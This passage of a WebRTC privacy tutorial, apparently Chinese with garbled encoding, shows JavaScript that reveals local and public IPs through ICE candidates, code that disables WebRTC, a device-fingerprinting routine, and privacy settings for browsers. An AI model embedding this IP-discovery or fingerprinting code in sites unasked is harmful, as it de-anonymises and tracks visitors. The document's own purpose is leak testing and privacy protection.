<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">({</span>
<span class="w">                </span><span class="nx">iceServers</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                    </span><span class="p">{</span><span class="nx">urls</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;stun:stun.l.google.com:19302&#39;</span><span class="p">},</span>
<span class="w">                    </span><span class="p">{</span><span class="nx">urls</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;stun:stun1.l.google.com:19302&#39;</span><span class="p">},</span>
<span class="w">                    </span><span class="p">{</span><span class="nx">urls</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;stun:stun.services.mozilla.com&#39;</span><span class="p">}</span>
<span class="w">                </span><span class="p">]</span>
<span class="w">            </span><span class="p">});</span>

<span class="w">            </span><span class="nx">pc</span><span class="p">.</span><span class="nx">createDataChannel</span><span class="p">(</span><span class="s1">&#39;leak-test&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">pc</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">()</span>
<span class="w">                </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">offer</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">pc</span><span class="p">.</span><span class="nx">setLocalDescription</span><span class="p">(</span><span class="nx">offer</span><span class="p">))</span>
<span class="w">                </span><span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">err</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">));</span>

<span class="w">            </span><span class="nx">pc</span><span class="p">.</span><span class="nx">onicecandidate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">event</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">event</span><span class="p">.</span><span class="nx">candidate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">pc</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="w">                    </span><span class="nx">resolve</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">generateReport</span><span class="p">());</span>
<span class="w">                    </span><span class="k">return</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>

<span class="w">                </span><span class="k">this</span><span class="p">.</span><span class="nx">processCandidate</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">candidate</span><span class="p">);</span>
<span class="w">            </span><span class="p">};</span>

<span class="w">            </span><span class="c1">// è¶…æ—¶ä¿æŠ¤</span>
<span class="w">            </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">pc</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="w">                </span><span class="nx">resolve</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">generateReport</span><span class="p">());</span>
<span class="w">            </span><span class="p">},</span><span class="w"> </span><span class="mf">5000</span><span class="p">);</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">processCandidate</span><span class="p">(</span><span class="nx">candidate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">candidates</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">candidate</span><span class="p">.</span><span class="nx">candidate</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">parts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">candidate</span><span class="p">.</span><span class="nx">candidate</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parts</span><span class="p">[</span><span class="mf">4</span><span class="p">];</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parts</span><span class="p">[</span><span class="mf">7</span><span class="p">];</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ip</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">isValidIP</span><span class="p">(</span><span class="nx">ip</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="nx">ips</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Found </span><span class="si">${</span><span class="nx">type</span><span class="si">}</span><span class="sb"> IP: </span><span class="si">${</span><span class="nx">ip</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">isValidIP</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// IPv4</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">ipv4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/^(\d{1,3}\.){3}\d{1,3}$/</span><span class="p">;</span>
<span class="w">        </span><span class="c1">// IPv6</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">ipv6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/^([\da-f]{1,4}:){7}[\da-f]{1,4}$/i</span><span class="p">;</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ipv4</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">ipv6</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">generateReport</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">ips</span><span class="o">:</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">ips</span><span class="p">),</span>
<span class="w">            </span><span class="nx">local</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">            </span><span class="kr">public</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">            </span><span class="nx">ipv6</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">            </span><span class="nx">candidates</span><span class="o">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">candidates</span>
<span class="w">        </span><span class="p">};</span>

<span class="w">        </span><span class="nx">report</span><span class="p">.</span><span class="nx">ips</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">ip</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">ip</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">report</span><span class="p">.</span><span class="nx">ipv6</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">isLocalIP</span><span class="p">(</span><span class="nx">ip</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">report</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">report</span><span class="p">.</span><span class="kr">public</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">ip</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">report</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">isLocalIP</span><span class="p">(</span><span class="nx">ip</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">ip</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;192.168.&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
<span class="w">               </span><span class="nx">ip</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;10.&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
<span class="w">               </span><span class="nx">ip</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^172\.(1[6-9]|2\d|3[01])\./</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">detector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WebRTCLeakDetector</span><span class="p">();</span>
<span class="nx">detector</span><span class="p">.</span><span class="nx">detect</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">report</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;=== WebRTC Leak Report ===&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Local IPs:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">report</span><span class="p">.</span><span class="nx">local</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Public IPs:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">report</span><span class="p">.</span><span class="kr">public</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;IPv6:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">report</span><span class="p">.</span><span class="nx">ipv6</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">report</span><span class="p">.</span><span class="kr">public</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="s1">&#39;âš ï¸ Public IP leak detected!&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹2-ç¦ç”¨-webrtc">ç¤ºä¾‹2: ç¦ç”¨ WebRTC</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ–¹æ³•1: è¦†ç›– RTCPeerConnection (ä¸æ¨èï¼Œå¯èƒ½ç ´ååŠŸèƒ½)</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">noop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{};</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">noopPromise</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">resolve</span><span class="p">();</span><span class="w"> </span><span class="p">};</span>

<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">RTCPeerConnection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">createOffer</span><span class="o">:</span><span class="w"> </span><span class="nx">noopPromise</span><span class="p">,</span>
<span class="w">            </span><span class="nx">createAnswer</span><span class="o">:</span><span class="w"> </span><span class="nx">noopPromise</span><span class="p">,</span>
<span class="w">            </span><span class="nx">setLocalDescription</span><span class="o">:</span><span class="w"> </span><span class="nx">noopPromise</span><span class="p">,</span>
<span class="w">            </span><span class="nx">setRemoteDescription</span><span class="o">:</span><span class="w"> </span><span class="nx">noopPromise</span><span class="p">,</span>
<span class="w">            </span><span class="nx">close</span><span class="o">:</span><span class="w"> </span><span class="nx">noop</span><span class="p">,</span>
<span class="w">            </span><span class="nx">addEventListener</span><span class="o">:</span><span class="w"> </span><span class="nx">noop</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;WebRTC has been disabled&#39;</span><span class="p">);</span>
<span class="p">})();</span>

<span class="c1">// æ–¹æ³•2: æµè§ˆå™¨è®¾ç½®</span>
<span class="c1">// Chrome: chrome://flags/#enable-webrtc-hide-local-ips-with-mdns</span>
<span class="c1">// Firefox: media.peerconnection.enabled = false</span>

<span class="c1">// æ–¹æ³•3: æµè§ˆå™¨æ‰©å±•</span>
<span class="c1">// - WebRTC Leak Prevent (Chrome)</span>
<span class="c1">// - Disable WebRTC (Firefox)</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹3-è®¾å¤‡æŒ‡çº¹é‡‡é›†">ç¤ºä¾‹3: è®¾å¤‡æŒ‡çº¹é‡‡é›†</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">collectWebRTCFingerprint</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">fingerprint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>

<span class="w">    </span><span class="c1">// 1. åª’ä½“è®¾å¤‡</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">devices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">mediaDevices</span><span class="p">.</span><span class="nx">enumerateDevices</span><span class="p">();</span>
<span class="w">        </span><span class="nx">fingerprint</span><span class="p">.</span><span class="nx">devices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">devices</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">d</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({</span>
<span class="w">            </span><span class="nx">kind</span><span class="o">:</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">kind</span><span class="p">,</span>
<span class="w">            </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">deviceId</span><span class="p">,</span>
<span class="w">            </span><span class="nx">groupId</span><span class="o">:</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">groupId</span>
<span class="w">        </span><span class="p">}));</span>
<span class="w">        </span><span class="nx">fingerprint</span><span class="p">.</span><span class="nx">deviceCount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">audioinput</span><span class="o">:</span><span class="w"> </span><span class="nx">devices</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">d</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">kind</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;audioinput&#39;</span><span class="p">).</span><span class="nx">length</span><span class="p">,</span>
<span class="w">            </span><span class="nx">videoinput</span><span class="o">:</span><span class="w"> </span><span class="nx">devices</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">d</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">kind</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;videoinput&#39;</span><span class="p">).</span><span class="nx">length</span><span class="p">,</span>
<span class="w">            </span><span class="nx">audiooutput</span><span class="o">:</span><span class="w"> </span><span class="nx">devices</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">d</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">kind</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;audiooutput&#39;</span><span class="p">).</span><span class="nx">length</span>
<span class="w">        </span><span class="p">};</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">fingerprint</span><span class="p">.</span><span class="nx">devices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;blocked&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// 2. æ”¯æŒçš„ç¼–è§£ç å™¨</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">pc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">RTCPeerConnection</span><span class="p">();</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">offer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">pc</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">({</span>
<span class="w">        </span><span class="nx">offerToReceiveAudio</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nx">offerToReceiveVideo</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">fingerprint</span><span class="p">.</span><span class="nx">codecs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">audio</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">        </span><span class="nx">video</span><span class="o">:</span><span class="w"> </span><span class="p">[]</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">offer</span><span class="p">.</span><span class="nx">sdp</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;\r\n&#39;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">line</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">line</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;a=rtpmap:&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">codec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">line</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mf">1</span><span class="p">];</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">line</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;audio&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">fingerprint</span><span class="p">.</span><span class="nx">codecs</span><span class="p">.</span><span class="nx">audio</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">codec</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">line</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;video&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">fingerprint</span><span class="p">.</span><span class="nx">codecs</span><span class="p">.</span><span class="nx">video</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">codec</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">pc</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// 3. RTC èƒ½åŠ›</span>
<span class="w">    </span><span class="nx">fingerprint</span><span class="p">.</span><span class="nx">capabilities</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">audio</span><span class="o">:</span><span class="w"> </span><span class="nx">RTCRtpSender</span><span class="p">.</span><span class="nx">getCapabilities</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">RTCRtpSender</span><span class="p">.</span><span class="nx">getCapabilities</span><span class="p">(</span><span class="s1">&#39;audio&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
<span class="w">        </span><span class="nx">video</span><span class="o">:</span><span class="w"> </span><span class="nx">RTCRtpSender</span><span class="p">.</span><span class="nx">getCapabilities</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">RTCRtpSender</span><span class="p">.</span><span class="nx">getCapabilities</span><span class="p">(</span><span class="s1">&#39;video&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">null</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fingerprint</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="nx">collectWebRTCFingerprint</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">fp</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;WebRTC Fingerprint:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">fp</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è®¡ç®—æŒ‡çº¹å“ˆå¸Œ</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">fpString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">fp</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fingerprint hash:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">hashCode</span><span class="p">(</span><span class="nx">fpString</span><span class="p">));</span>
<span class="p">});</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">hashCode</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="kr">char</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
<span class="w">        </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="nx">hash</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mf">5</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">hash</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="kr">char</span><span class="p">;</span>
<span class="w">        </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">hash</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">hash</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="ç”¨æˆ·éšç§ä¿æŠ¤">ç”¨æˆ·éšç§ä¿æŠ¤</h3>

      <ol>
        <li>
          <p><strong>ä½¿ç”¨æµè§ˆå™¨æ‰©å±•</strong></p>

          <ul>
            <li>WebRTC Leak Prevent</li>
            <li>uBlock Origin (å¯ç”¨éšç§è¿‡æ»¤)</li>
            <li>Privacy Badger</li>
          </ul>
        </li>
        <li>
          <p><strong>æµè§ˆå™¨è®¾ç½®</strong></p>

          <p><strong>Firefox</strong>:</p>

          <ul>
            <li><code>about:config</code> â†’ <code>media.peerconnection.enabled</code> = <code>false</code></li>
            <li><code>media.peerconnection.ice.default_address_only</code> = <code>true</code></li>
            <li><code>media.peerconnection.ice.no_host</code> = <code>true</code></li>
          </ul>

          <p><strong>Chrome</strong>:</p>

          <ul>
            <li><code>chrome://flags/#enable-webrtc-hide-local-ips-with-mdns</code> å¯ç”¨</li>
            <li>ä½¿ç”¨æ‰©å±•ç¨‹åº</li>
          </ul>
        </li>
        <li>
          <p><strong>VPN é…ç½®</strong></p>

          <ul>
            <li>ç¡®ä¿ VPN æ”¯æŒ WebRTC ä¿æŠ¤</li>
            <li>å¯ç”¨ VPN çš„ IPv6 æ³„éœ²é˜²æŠ¤</li>
            <li>æµ‹è¯• VPN æ˜¯å¦çœŸæ­£é˜»æ­¢ WebRTC æ³„éœ²</li>
          </ul>
        </li>
        <li>
          <p><strong>å®šæœŸæ£€æµ‹</strong></p>

          <ul>
            <li>è®¿é—® https://browserleaks.com/webrtc</li>
            <li>ä½¿ç”¨ https://ipleak.net</li>
            <li>è‡ªå®šä¹‰æ£€æµ‹è„šæœ¬</li>
          </ul>
        </li>
      </ol>

      <h3 id="ç½‘ç«™å¼€å‘è€…">ç½‘ç«™å¼€å‘è€…</h3>

      <ol>
        <li>
          <p><strong>æœ€å°æƒé™åŸåˆ™</strong></p>

          <ul>
            <li>ä»…åœ¨å¿…è¦æ—¶è¯·æ±‚åª’ä½“æƒé™</li>
            <li>æ˜ç¡®å‘ŠçŸ¥ç”¨æˆ·ä¸ºä½•éœ€è¦ WebRTC</li>
          </ul>
        </li>
        <li>
          <p><strong>éšç§å£°æ˜</strong></p>

          <ul>
            <li>è¯´æ˜å¦‚ä½•ä½¿ç”¨ WebRTC</li>
            <li>å‘ŠçŸ¥å¯èƒ½æ”¶é›†çš„ä¿¡æ¯</li>
          </ul>
        </li>
        <li>
          <p><strong>æä¾›æ§åˆ¶é€‰é¡¹</strong></p>

          <ul>
            <li>å…è®¸ç”¨æˆ·ç¦ç”¨ WebRTC åŠŸèƒ½</li>
            <li>æä¾›æ›¿ä»£æ–¹æ¡ˆ</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

